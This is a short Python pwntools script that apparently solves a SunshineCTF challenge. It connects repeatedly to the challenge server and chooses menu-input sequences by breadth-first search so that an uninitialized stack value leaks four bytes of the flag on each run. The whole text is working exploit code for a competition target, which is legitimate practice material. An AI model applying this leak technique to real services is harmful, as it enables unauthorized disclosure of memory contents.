from pwn import *
import re
from collections import deque

chunk_depths = [0x400, 0x480, 0x520, 0x570, 0x5a0, 0x640, 0x690, 0x6c0, 0x760, 0x7b0, 0x7e0, 0x800, 0x880]

loops = [
    (0x120, ['3', '5']), # scream
    (0x400, ['1', '2', 'somewhere']), # rep_outage
    (0x570, ['1', '4', '1', 'somewhere']), # tech_supp -> rep_outage
    (0x570 + 0x170, ['1', '4', '9', '1', 'somewhere']),
    (0x570 + 0x2e0, ['1', '4', '9', '9', '1', 'somewhere']),
]

def get_path_for_depth(target_d):
    q = deque([(0, [])])
    visited = set()
    while q:
        tot, path = q.popleft()
        if tot in visited:
            continue
        visited.add(tot)
        if tot == target_d:
            return path
        if tot > target_d:
            continue
        for l_cost, l_inp in loops:
            if tot + l_cost <= target_d:
                q.append((tot + l_cost, path + l_inp))
    return None

context.log_level = 'error'

flag_chunks = []
for c, d in enumerate(chunk_depths):
    loop_inputs = get_path_for_depth(d)
    inputs = ['42'] + loop_inputs + ['1', '6', '2', '123', '123', '123', 'x', 'x', '1']
    
    r = remote('sunshinectf.games', 26199)
    payload = '\n'.join(inputs) + '\n'
    r.send(payload.encode())
    
    out = r.recvall(timeout=5).decode(errors='replace')
    r.close()
    
    m = re.search(r'You\'ve entered \"(-?\d+)\"', out)
    if m:
        val = int(m.group(1))
        b = (val & 0xffffffff).to_bytes(4, 'little')
        flag_chunks.append(b)
        print(f'Chunk {c:2d} (depth {d:#05x}): val={val:11d}, bytes={b}')
    else:
        print(f'Chunk {c:2d} (depth {d:#05x}): FAILED')
        break

raw_flag = b''.join(flag_chunks)
print('Flag:', raw_flag.decode(errors='replace'))
